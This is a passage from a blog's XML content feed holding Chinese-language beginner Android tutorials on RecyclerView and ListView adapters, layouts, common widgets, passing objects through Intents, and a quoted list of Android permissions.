$&#123;girl.girlName&#125;&quot;</span>,Toast.LENGTH_SHORT).show()</span><br><span class="line">        &#125;</span><br><span class="line">        viewHolder.girlImg.setOnClickListener &#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">position</span> <span class="operator">=</span> viewHolder.adapterPosition</span><br><span class="line">            <span class="type">val</span> <span class="variable">girl</span> <span class="operator">=</span> girlList[position]</span><br><span class="line">            Toast.makeText(parent.context,<span class="string">&quot;you clicked img $&#123;girl.girlName&#125;&quot;</span>,Toast.LENGTH_SHORT).show()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  viewHolder</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>点击事件是在onCreateViewHolder中定义的。</p>
<blockquote>
<p>上述代码分别为最<br>外层布局和ImageView都注册了点击事件，itemView表示的就是最外层布局。RecyclerView<br>的强大之处也在于此，它可以轻松实现子项中任意控件或布局的点击事件。我们在两个点击事<br>件中先获取了用户点击的position，然后通过position拿到相应的Fruit实例，再使用Toast分<br>别弹出两种不同的内容以示区别</p>
</blockquote>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门（listview控件）</title>
    <url>/posts/15967b87/</url>
    <content><![CDATA[<p><del><strong>很烦，，，写了好久然后浏览器闪退了。。。然后写的全无了。</strong></del><br>所以再写一遍就随便写点了。使用listview的关键。</p>
<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><ol>
<li>直接在布局引入一个listview控件</li>
<li>然后因为listview的数据不能直接传入。需要通过adapter适配器来实现的，其中最常用的就是arrayAdapter</li>
<li>因此在activity中，初始化一个arrayAdapter。<br> 他的初始化一共需要三个参数。<ol>
<li>activity：也就是需要把本类传进去。</li>
<li>resourceid: 需要传入子项布局（也就是listview中每一项内容的样式布局）（可以使用系统默认的，也可以自己定义一个布局。这里不展示）</li>
<li>data：传入数据源，一般都是列表。</li>
</ol>
</li>
<li>然后使lisview的adapter属性赋值为你初始的内容<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">listview.adapter = arrayAdapter&lt;String&gt;()</span><br></pre></td></tr></table></figure>
然后即完成了基本使用。</li>
</ol>
<h2 id="进阶使用"><a href="#进阶使用" class="headerlink" title="进阶使用"></a>进阶使用</h2><p>主要就是修改第二个参数，resourceid，也就是你自己定义的布局和样式。但是你不止需要样式，还需要设置逻辑。<br>因此这里选择再写一个适配器<code>FruitAdapter</code>去继承ArrayAdapter，然后重写<code>getView()</code>方法，实现重现。<br>getView()的三个属性</p>
<ol>
<li>position：表明当前的对应的在数据源的第几个序列</li>
<li>convertView： 用来缓存View，如果已经有缓存，可以大大提高效率。</li>
<li>parent：父元素<br>具体的逻辑就是：先获取你需要修改的布局，并将其转化成view。然后通过函数来修改其中每个部分的内容。以下是个示例代码：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Fruit</span>(val name: String, val imageId: Int) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FruiterAdapter</span>(activity: Activity, val resourceId: Int, data: List&lt;Fruit&gt;) :</span><br><span class="line">    ArrayAdapter&lt;Fruit&gt;(activity, resourceId, data) &#123;</span><br><span class="line">    override fun <span class="title function_">getView</span><span class="params">(position: Int, convertView: View?, parent: ViewGroup)</span>: View &#123;</span><br><span class="line">        <span class="comment">//直接将布局文件转化为View类</span></span><br><span class="line">        <span class="type">val</span> <span class="variable">view</span> <span class="operator">=</span> LayoutInflater.from(context).inflate(resourceId, parent, <span class="literal">false</span>)</span><br><span class="line">        val fruitImage: ImageView = view.findViewById(R.id.fruitImage)</span><br><span class="line">        val fruitName: TextView = view.findViewById(R.id.fruitName)</span><br><span class="line">        <span class="type">val</span> <span class="variable">fruit</span> <span class="operator">=</span> getItem(position)<span class="comment">//获取当前项的Fruit实例</span></span><br><span class="line">        <span class="keyword">if</span> (fruit != <span class="literal">null</span>) &#123;</span><br><span class="line">            fruitImage.setImageResource(fruit.imageId)</span><br><span class="line">            fruitName.text = fruit.name</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> view</span><br><span class="line">        <span class="comment">//使用视图绑定</span></span><br><span class="line"><span class="comment">//        var binding = FruitItemBinding.inflate(LayoutInflater.from(context),parent,false)</span></span><br><span class="line"><span class="comment">//        binding.apply &#123;</span></span><br><span class="line"><span class="comment">//            var fruit = getItem(position)</span></span><br><span class="line"><span class="comment">//            if(fruit!=null)&#123;</span></span><br><span class="line"><span class="comment">//                fruitImage.setImageResource(fruit.imageId)</span></span><br><span class="line"><span class="comment">//                fruitName.text = fruit.name</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        return binding.root</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="提高效率"><a href="#提高效率" class="headerlink" title="提高效率"></a>提高效率</h2><ol>
<li>使用convertView，他已经缓存了页面，可以大大提高运行效率</li>
<li>使用viewholder，他可以被存放在<code>view.tag</code>中。也可以从convertView中取出。使用它可以避免很多次<code>findViewById</code><br>以上两种方法可以大大的提高效率</li>
</ol>
<h2 id="点击事件"><a href="#点击事件" class="headerlink" title="点击事件"></a>点击事件</h2><p>直接上示例代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">listView.setOnItemClickListener &#123; parent, view, position, id -&gt;</span><br><span class="line"> <span class="type">val</span> <span class="variable">fruit</span> <span class="operator">=</span> fruitList[position]</span><br><span class="line"> Toast.makeText(<span class="built_in">this</span>, fruit.name, Toast.LENGTH_SHORT).show()</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p> 其中如果有不需要用到的参数，可以直接用<code>_</code>代替，不去接受<br> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">listView.setOnItemClickListener &#123; _,_, position, _ -&gt;</span><br><span class="line"> <span class="type">val</span> <span class="variable">fruit</span> <span class="operator">=</span> fruitList[position]</span><br><span class="line"> Toast.makeText(<span class="built_in">this</span>, fruit.name, Toast.LENGTH_SHORT).show()</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android常用布局</title>
    <url>/posts/1343ead2/</url>
    <content><![CDATA[<h2 id="布局和控件的关系"><a href="#布局和控件的关系" class="headerlink" title="布局和控件的关系"></a>布局和控件的关系</h2><p><img src="https://image.zfxt.top/hexo-blog/Android%E5%B8%B8%E7%94%A8%E5%B8%83%E5%B1%80-2023-07-16-50-47.png"></p>
<h3 id="LinearLayout"><a href="#LinearLayout" class="headerlink" title="LinearLayout"></a>LinearLayout</h3><table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">释义</th>
<th align="left">样例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">orientation</td>
<td align="left">指定了排列方向</td>
<td align="left">vertical，horizontal</td>
</tr>
<tr>
<td align="left">layout_gravity</td>
<td align="left">控制控件的对齐方式</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">layout_weight</td>
<td align="left">指定控件的大小</td>
<td align="left"></td>
</tr>
</tbody></table>
<blockquote>
<p>一般会将layout_width指定为0dp，这是一种标准的写法</p>
</blockquote>
<p>layout_weight的计算方式<br>系统会先把LinearLayout下所有控件指定的layout_weight值相加，得到一个总值，<br>然后每个控件所占大小的比例就是用该控件的layout_weight值除以刚才算出的总值。因此如<br>果想让EditText占据屏幕宽度的3&#x2F;5，Button占据屏幕宽度的2&#x2F;5，只需要将EditText的layout_ weight改成3，Button的layout_weight改成2就可以了。</p>
<h3 id="RelativeLayout"><a href="#RelativeLayout" class="headerlink" title="RelativeLayout"></a>RelativeLayout</h3><p>相对布局</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:id</span>=<span class="string">&quot;@+id/button5&quot;</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:layout_alignParentBottom</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:layout_alignParentRight</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag"> <span class="attr">android:text</span>=<span class="string">&quot;Button 5&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>大致内容即上，用来描述与父容器的相对位置关系<br>layout_above<br>layout_below<br>layout_toLeftOf<br>layout_toRightOf<br>相对其他控件，进行位置的比较<br>layout_alignLeft<br>layout_alignRight<br>layout_alignTop<br>layout_alignBottom<br>也是相对于其他控件，但是他是边缘进行对齐</p>
<h3 id="FrameLayout"><a href="#FrameLayout" class="headerlink" title="FrameLayout"></a>FrameLayout</h3><p>帧布局<br>它的应用场景比较少。这种布局没有丰富的定位方式，所有的控件都会默认摆放在布局的左上角。<br>而且他可以控件之间相互覆盖，压在其他控件上</p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android常用控件</title>
    <url>/posts/a071fa17/</url>
    <content><![CDATA[<h2 id="常用控件"><a href="#常用控件" class="headerlink" title="常用控件"></a>常用控件</h2><h3 id="TextView"><a href="#TextView" class="headerlink" title="TextView"></a>TextView</h3><p><strong>显示文本</strong></p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">释义</th>
<th align="left">样例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">gravity</td>
<td align="left">来指定文字的对齐方式</td>
<td align="left">top,bottom,start等</td>
</tr>
<tr>
<td align="left">textColor</td>
<td align="left">指定文字颜色</td>
<td align="left">red，green</td>
</tr>
<tr>
<td align="left">textSize</td>
<td align="left">指定文字大小</td>
<td align="left">sp为单位，这样当用户在系统中修改了文字显示尺寸时，应用</td>
</tr>
<tr>
<td align="left">程序中的文字大小也会跟着变化。重新运行程序</td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">text</td>
<td align="left">指定文字内容</td>
<td align="left"></td>
</tr>
</tbody></table>
<h3 id="Button"><a href="#Button" class="headerlink" title="Button"></a>Button</h3><p><strong>放置按钮</strong></p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">释义</th>
<th align="left">样例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">textAllCaps</td>
<td align="left">指定文字是否大小写</td>
<td align="left">false,true</td>
</tr>
</tbody></table>
<p>注册Button点击事件的方式</p>
<ol>
<li>函数式API<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button.setOnClickListener &#123;</span><br><span class="line"> <span class="comment">// 在此处添加逻辑</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
 2.用实现接口的方式来进行注册 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">class</span> <span class="title class_">MainActivity</span> : AppCompatActivity(),View.OnClickListener</span><br><span class="line"> &#123;</span><br><span class="line">	 override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">		 <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">		 setContentView(R.layout.activity_main)</span><br><span class="line">		 <span class="comment">//让button使用本类中的方法</span></span><br><span class="line"> 		button.setOnClickListener(<span class="built_in">this</span>)</span><br><span class="line">	 &#125;</span><br><span class="line"> override fun <span class="title function_">onClick</span><span class="params">(v: View?)</span> &#123;</span><br><span class="line">	 <span class="keyword">when</span> (v?.id) &#123;</span><br><span class="line">		 R.id.button -&gt; &#123;</span><br><span class="line">		 <span class="comment">// 在此处添加逻辑</span></span><br><span class="line">		 &#125;</span><br><span class="line">	 &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="EditText"><a href="#EditText" class="headerlink" title="EditText"></a>EditText</h3><p><strong>允许用户在控件里输入和编辑内容</strong></p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">释义</th>
<th align="left">样例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">hint</td>
<td align="left">段提示性的文本</td>
<td align="left">输入文字后消失</td>
</tr>
<tr>
<td align="left">maxLines</td>
<td align="left">最大行数</td>
<td align="left">超过行数会自动滚动</td>
</tr>
</tbody></table>
<h3 id="ImageView"><a href="#ImageView" class="headerlink" title="ImageView"></a>ImageView</h3><p><strong>图片展示</strong></p>
<blockquote>
<p>图片通常是放在以drawable开头的目录下的，并<br>且要带上具体的分辨率。现在最主流的手机屏幕分辨率大多是xxhdpi的，所以我们在res目录下<br>再新建一个drawable-xxhdpi目录，然后将事先准备好的两张图片img_1.png和img_2.png复<br>制到该目录当中</p>
</blockquote>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">释义</th>
<th align="left">样例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">src</td>
<td align="left">选择图片文件</td>
<td align="left">@drawable&#x2F;img_1</td>
</tr>
<tr>
<td align="left">setImageResource()</td>
<td align="left">修改图片资源</td>
<td align="left">在函数中修改</td>
</tr>
</tbody></table>
<h3 id="ProgressBar"><a href="#ProgressBar" class="headerlink" title="ProgressBar"></a>ProgressBar</h3><p>进度条</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">释义</th>
<th align="left">样例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">visibility</td>
<td align="left">是否可见</td>
<td align="left">这个值是默认值，不指定android:visibility时，控件都是可见的。invisible表示控件不可见，但是它仍然占据着原来的位置和大小，可以理解成控件变成透明状态了。gone则表示控件不仅不可见，而且不再占用任何屏幕空间。</td>
</tr>
<tr>
<td align="left">setVisibility()</td>
<td align="left">通过函数修改进度条的可见性</td>
<td align="left">View.VISIBLE，View.INVISIBLE和View.GONE</td>
</tr>
<tr>
<td align="left">style</td>
<td align="left">进度条样式</td>
<td align="left">“?android:attr&#x2F;progressBarStyleHorizontal”</td>
</tr>
<tr>
<td align="left">max</td>
<td align="left">给进度条设置一个最大值</td>
<td align="left">可以在代码中动态修改进度</td>
</tr>
</tbody></table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">progressBar.progress+=<span class="number">10</span></span><br></pre></td></tr></table></figure>

<h3 id="AlertDialog"><a href="#AlertDialog" class="headerlink" title="AlertDialog"></a>AlertDialog</h3><p><strong>在当前界面弹出一个对话框</strong></p>
<p>常用展示方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AlertDialog.Builder(<span class="built_in">this</span>).apply &#123;</span><br><span class="line"> setTitle(<span class="string">&quot;This is Dialog&quot;</span>)</span><br><span class="line"> setMessage(<span class="string">&quot;Something important.&quot;</span>)</span><br><span class="line"> setCancelable(<span class="literal">false</span>)</span><br><span class="line"> <span class="comment">//能否通过取消键取消</span></span><br><span class="line"> setPositiveButton(<span class="string">&quot;OK&quot;</span>) &#123; dialog, which -&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> setNegativeButton(<span class="string">&quot;Cancel&quot;</span>) &#123; dialog, which -&gt;</span><br><span class="line"> &#125;</span><br><span class="line"> show()</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p> <img src="https://image.zfxt.top/hexo-blog/Android%E5%B8%B8%E7%94%A8%E6%8E%A7%E4%BB%B6-2023-07-14-22-36.png"></p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android开发高级技巧</title>
    <url>/posts/e5a9d9c9/</url>
    <content><![CDATA[<h1 id="全局获取context"><a href="#全局获取context" class="headerlink" title="全局获取context"></a>全局获取context</h1><p>前提：或许目前你还没有为得不到Context而发愁过，因为我们很多的操作是在Activity中进行的，而Activity本身就是一个Context对象。但是，当应用程序的架构逐渐开始复杂起来的时候，很多逻辑代码将脱离Activity类，但此时你又恰恰需要使用Context，也许这个时候你就会感到有些伤脑筋了。<br>解决：Android提供了一个Application类，每当应用程序启动的时候，系统就会自动将这个类进行初始化。而我们可以定制一个自己的Application类，以便于管理程序内一些全局的状态信息，比如全局Context。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyApplication</span> : Application() &#123;</span><br><span class="line"> 	companion object &#123;</span><br><span class="line"> 		lateinit <span class="keyword">var</span> context: Context</span><br><span class="line"> 	&#125;</span><br><span class="line">	 override fun <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">		 <span class="built_in">super</span>.onCreate()</span><br><span class="line">		 context = applicationContext</span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样我们就可以以静态变量的形式获取Context对象了。需要注意的是，将Context设置成静态变量很容易会产生内存泄漏的问题，所以这是一种有风险的做法.<br>但是由于这里获取的不是Activity或Service中的Context，而是Application中的Context，它全局只会存在一份实例，并且在整个应用程序的生命周期内都不会回收，因此是不存在内存泄漏风险的。<br>程序启动的时候应该初始化MyApplication类,在AndroidManifest.xml文件的<code>&lt;application&gt;</code>标签下进行指定<code>android:name=&quot;.MyApplication&quot;</code>.</p>
<h1 id="使用Intent传递对象"><a href="#使用Intent传递对象" class="headerlink" title="使用Intent传递对象"></a>使用Intent传递对象</h1><p>我们用的一直都是一些基础的数据类型如Int，String之类的。而不能传递我们自定义的对象。因此我们需要使用到<strong>序列化</strong></p>
<h2 id="Serializable方式"><a href="#Serializable方式" class="headerlink" title="Serializable方式"></a>Serializable方式</h2><p>让你的类实现Serializable接口，把对象放入intent时，就是普通的方法<code>intent.putExtra(&quot;person_data&quot;, person)</code><br>但是取出时需要使用特定的获取方法<code>val person = intent.getSerializableExtra(&quot;person_data&quot;) as Person</code>，这样子才能获得序列化后的对象。<strong>注意，虽然你传递的对象内的值都一摸一样，但是这两个对象不是同一个对象。</strong></p>
<h2 id="Parcelable方式"><a href="#Parcelable方式" class="headerlink" title="Parcelable方式"></a>Parcelable方式</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> : Parcelable &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="type">var</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    override fun <span class="title function_">writeToParcel</span><span class="params">(parcel: Parcel, flags: Int)</span> &#123;</span><br><span class="line">        parcel.writeString(name) <span class="comment">// 写出name</span></span><br><span class="line">        parcel.writeInt(age) <span class="comment">// 写出age</span></span><br><span class="line">    &#125;</span><br><span class="line">    override fun <span class="title function_">describeContents</span><span class="params">()</span>: Int &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">    companion object CREATOR : Parcelable.Creator&lt;Person&gt; &#123;</span><br><span class="line">        override fun <span class="title function_">createFromParcel</span><span class="params">(parcel: Parcel)</span>: Person &#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">person</span> <span class="operator">=</span> Person()</span><br><span class="line">            person.name = parcel.readString() ?: <span class="string">&quot;&quot;</span> <span class="comment">// 读取name</span></span><br><span class="line">            person.age = parcel.readInt() <span class="comment">// 读取age</span></span><br><span class="line">            <span class="keyword">return</span> person</span><br><span class="line">        &#125;</span><br><span class="line">        override fun <span class="title function_">newArray</span><span class="params">(size: Int)</span>: Array&lt;Person?&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> arrayOfNulls(size)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种方式更加复杂，他需要实现Parcelable接口，然后重写他的describeContents()和writeToParcel()这两个方法。其中describeContents()方法直接返回0就可以了。而对于writeToParcel需要对他的每个属性使用<code>write***</code>方法,如上所示。<br>除此之外我们还必须在Person类中提供一个名为CREATOR的匿名类实现。接着需要重写createFromParcel()和newArray()这两个方法，在createFromParcel()方法中，我们要创建一个Person对象进行返回，并读取刚才写出的name和age字段。其中name和age都是调用Parcel的readXxx()方法读取到的，注意这里读取的顺序一定要和刚才写出的顺序完全相同。而newArray()方法中的实现就简单多了，只需要调用arrayOfNulls()方法，并使用参数中传入的size作为数组大小，创建一个空的Person数组即可</p>
<p>然后传入intent还是一样的，但是取出时需要使用另外的方法<code>val person =intent.getParcelableExtra(&quot;person_data&quot;) as Person</code><br>但是这种实现方法过于复杂，所以kotlin实现了简单的语法，只要加上@Parcelize注解即可。前提是所有数据必须封装在对象的主构造函数中，也就是简单的写为data class。<br>对比一下，Serializable的方式较为简单，但由于会把整个对象进行序列化，因此效率会比Parcelable方式低一些，所以在通常情况下，还是更加推荐使用Parcelable的方式来实现Intent传递对象的功能。</p>
<h1 id="定制自己的日志工具"><a href="#定制自己的日志工具" class="headerlink" title="定制自己的日志工具"></a>定制自己的日志工具</h1>]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android权限说明(引用）</title>
    <url>/posts/e9b7c22/</url>
    <content><![CDATA[<blockquote>
<p>引用自<a href="https://juejin.cn/post/7075669571025256462">掘金</a></p>
</blockquote>
<p>访问登记属性android.permission.ACCESS_CHECKIN_PROPERTIES，读取或写入登记check-in数据库属性表的权限 </p>
<p>获取错略位置android.permission.ACCESS_COARSE_LOCATION，通过WiFi或移动基站的方式获取用户错略的经纬度信息，定位精度大概误差在30~1500米 </p>
<p>获取精确位置android.permission.ACCESS_FINE_LOCATION，通过GPS芯片接收卫星的定位信息，定位精度达10米以内</p>
<p>访问定位额外命令android.permission.ACCESS_LOCATION_EXTRA_COMMANDS，允许程序访问额外的定位提供者指令 </p>
<p>获取模拟定位信息android.permission.ACCESS_MOCK_LOCATION，获取模拟定位信息，一般用于帮助开发者调试应用 </p>
<p>获取网络状态android.permission.ACCESS_NETWORK_STATE，获取网络信息状态，如当前的网络连接是否有效 </p>
<p>访问Surface Flinger android.permission.ACCESS_SURFACE_FLINGER，Android平台上底层的图形显示支持，一般用于游戏或照相机预览界面和底层模式的屏幕截图 </p>
<p>获取WiFi状态android.permission.ACCESS_WIFI_STATE，获取当前WiFi接入的状态以及WLAN热点的信息 </p>
<p>账户管理android.permission.ACCOUNT_MANAGER，获取账户验证信息，主要为GMail账户信息，只有系统级进程才能访问的权限 </p>
<p>验证账户android.permission.AUTHENTICATE_ACCOUNTS，允许一个程序通过账户验证方式访问账户管理ACCOUNT_MANAGER相关信息</p>
<p>电量统计android.permission.BATTERY_STATS，获取电池电量统计信息 </p>
<p>绑定小插件android.permission.BIND_APPWIDGET，允许一个程序告诉appWidget服务需要访问小插件的数据库，只有非常少的应用才用到此权限 </p>
<p>绑定设备管理android.permission.BIND_DEVICE_ADMIN，请求系统管理员接收者receiver，只有系统才能使用 </p>
<p>绑定输入法android.permission.BIND_INPUT_METHOD，请求InputMethodService服务，只有系统才能使用 </p>
<p>绑定RemoteView android.permission.BIND_REMOTEVIEWS，必须通过RemoteViewsService服务来请求，只有系统才能用 </p>
<p>绑定壁纸android.permission.BIND_WALLPAPER，必须通过WallpaperService服务来请求，只有系统才能用 </p>
<p>使用蓝牙android.permission.BLUETOOTH，允许程序连接配对过的蓝牙设备 </p>
<p>蓝牙管理android.permission.BLUETOOTH_ADMIN，允许程序进行发现和配对新的蓝牙设备 </p>
<p>变成砖头android.permission.BRICK，能够禁用手机，非常危险，顾名思义就是让手机变成砖头 </p>
<p>应用删除时广android.permission.BROADCAST_PACKAGE_REMOVED，当一个应用在删除时触发一个广播 </p>
<p>收到短信时广播android.permission.BROADCAST_SMS，当收到短信时触发一个广播 </p>
<p>连续广播android.permission.BROADCAST_STICKY，允许一个程序收到广播后快速收到下一个广播 </p>
<p>WAP PUSH广播android.permission.BROADCAST_WAP_PUSH，WAP PUSH服务收到后触发一个广播 </p>
<p>拨打电话android.permission.CALL_PHONE，允许程序从非系统拨号器里输入电话号码 </p>
<p>通话权限android.permission.CALL_PRIVILEGED，允许程序拨打电话，替换系统的拨号器界面 </p>
<p>拍照权限android.permission.CAMERA，允许访问摄像头进行拍照 </p>
<p>改变组件状态android.permission.CHANGE_COMPONENT_ENABLED_STATE，改变组件是否启用状态 </p>
<p>改变配置android.permission.CHANGE_CONFIGURATION，允许当前应用改变配置，如定位 </p>
<p>改变网络状态android.permission.CHANGE_NETWORK_STATE，改变网络状态如是否能联网 </p>
<p>改变WiFi多播状态android.permission.CHANGE_WIFI_MULTICAST_STATE，改变WiFi多播状态 </p>
<p>改变WiFi状态android.permission.CHANGE_WIFI_STATE，改变WiFi状态 </p>
<p>清除应用缓存android.permission.CLEAR_APP_CACHE，清除应用缓存 </p>
<p>清除用户数据android.permission.CLEAR_APP_USER_DATA，清除应用的用户数据 </p>
<p>底层访问权限android.permission.CWJ_GROUP，允许CWJ账户组访问底层信息 </p>
<p>手机优化大师扩展权限android.permission.CELL_PHONE_MASTER_EX</p>
<p>控制定位更新android.permission.CONTROL_LOCATION_UPDATES，允许获得移动网络定位信息改变 </p>
<p>删除缓存文件android.permission.DELETE_CACHE_FILES，允许应用删除缓存文件 </p>
<p>删除应用android.permission.DELETE_PACKAGES，允许程序删除应用 </p>
<p>电源管理android.permission.DEVICE_POWER，允许访问底层电源管理 </p>
<p>应用诊断android.permission.DIAGNOSTIC，允许程序到RW到诊断资源 </p>
<p>禁用键盘锁android.permission.DISABLE_KEYGUARD，允许程序禁用键盘锁 </p>
<p>转存系统信息android.permission.DUMP，允许程序获取系统dump信息从系统服务 </p>
<p>状态栏控制android.permission.EXPAND_STATUS_BAR，允许程序扩展或收缩状态栏 </p>
<p>工厂测试模式android.permission.FACTORY_TEST，允许程序运行工厂测试模式 </p>
<p>使用闪光灯android.permission.FLASHLIGHT，允许访问闪光灯 </p>
<p>强制后退android.permission.FORCE_BACK，允许程序强制使用back后退按键，无论Activity是否在顶层 </p>
<p>访问账户Gmail列表android.permission.GET_ACCOUNTS，访问GMail账户列表 </p>
<p>获取应用大小android.permission.GET_PACKAGE_SIZE，获取应用的文件大小 </p>
<p>获取任务信息android.permission.GET_TASKS，允许程序获取当前或最近运行的应用 </p>
<p>允许全局搜索android.permission.GLOBAL_SEARCH，允许程序使用全局搜索功能 </p>
<p>硬件测试android.permission.HARDWARE_TEST，访问硬件辅助设备，用于硬件测试 </p>
<p>注射事件android.permission.INJECT_EVENTS，允许访问本程序的底层事件，获取按键、轨迹球的事件流 </p>
<p>安装定位提供android.permission.INSTALL_LOCATION_PROVIDER，安装定位提供 </p>
<p>安装应用程序android.permission.INSTALL_PACKAGES，允许程序安装应用 </p>
<p>内部系统窗口android.permission.INTERNAL_SYSTEM_WINDOW，允许程序打开内部窗口，不对第三方应用程序开放此权限 </p>
<p>访问网络android.permission.INTERNET，访问网络连接，可能产生GPRS流量 </p>
<p>结束后台进程android.permission.KILL_BACKGROUND_PROCESSES，允许程序调用killBackgroundProcesses(String).方法结束后台进程 </p>
<p>管理账户android.permission.MANAGE_ACCOUNTS，允许程序管理AccountManager中的账户列表 </p>
<p>程序引用android.permission.MANAGE_APP_TOKENS，管理创建、摧毁、Z轴顺序，仅用于系统 </p>
<p>高级权限android.permission.MTWEAK_USER，允许mTweak用户访问高级系统权限 </p>
<p>社区权限android.permission.MTWEAK_FORUM，允许使用mTweak社区权限 </p>
<p>软格式化android.permission.MASTER_CLEAR，允许程序执行软格式化，删除系统配置信息 </p>
<p>修改声音设置android.permission.MODIFY_AUDIO_SETTINGS，修改声音设置信息 </p>
<p>修改电话状态android.permission.MODIFY_PHONE_STATE，修改电话状态，如飞行模式，但不包含替换系统拨号器界面 </p>
<p>格式化文件系统android.permission.MOUNT_FORMAT_FILESYSTEMS，格式化可移动文件系统，比如格式化清空SD卡 </p>
<p>挂载文件系统android.permission.MOUNT_UNMOUNT_FILESYSTEMS，挂载、反挂载外部文件系统 </p>
<p>允许NFC通讯android.permission.NFC，允许程序执行NFC近距离通讯操作，用于移动支持 </p>
<p>永久Activityandroid.permission.PERSISTENT_ACTIVITY，创建一个永久的Activity，该功能标记为将来将被移除 </p>
<p>处理拨出电话android.permission.PROCESS_OUTGOING_CALLS，允许程序监视，修改或放弃播出电话 </p>
<p>读取日程提醒android.permission.READ_CALENDAR，允许程序读取用户的日程信息 </p>
<p>读取联系人android.permission.READ_CONTACTS，允许应用访问联系人通讯录信息 </p>
<p>屏幕截图android.permission.READ_FRAME_BUFFER，读取帧缓存用于屏幕截图 </p>
<p>读取收藏夹和历史记录com.android.browser.permission.READ_HISTORY_BOOKMARKS，读取浏览器收藏夹和历史记录 </p>
<p>读取输入状态 android.permission.READ_INPUT_STATE，读取当前键的输入状态，仅用于系统 </p>
<p>读取系统日志 android.permission.READ_LOGS，读取系统底层日志 </p>
<p>读取电话状态 android.permission.READ_PHONE_STATE，访问电话状态 </p>
<p>读取短信内容 android.permission.READ_SMS，读取短信内容 </p>
<p>读取同步设置 android.permission.READ_SYNC_SETTINGS，读取同步设置，读取Google在线同步设置 </p>
<p>读取同步状态 android.permission.READ_SYNC_STATS，读取同步状态，获得Google在线同步状态 </p>
<p>重启设备 android.permission.REBOOT，允许程序重新启动设备 </p>
<p>开机自动允许 android.permission.RECEIVE_BOOT_COMPLETED，允许程序开机自动运行 </p>
<p>接收彩信 android.permission.RECEIVE_MMS，接收彩信 </p>
<p>接收短信 android.permission.RECEIVE_SMS，接收短信 </p>
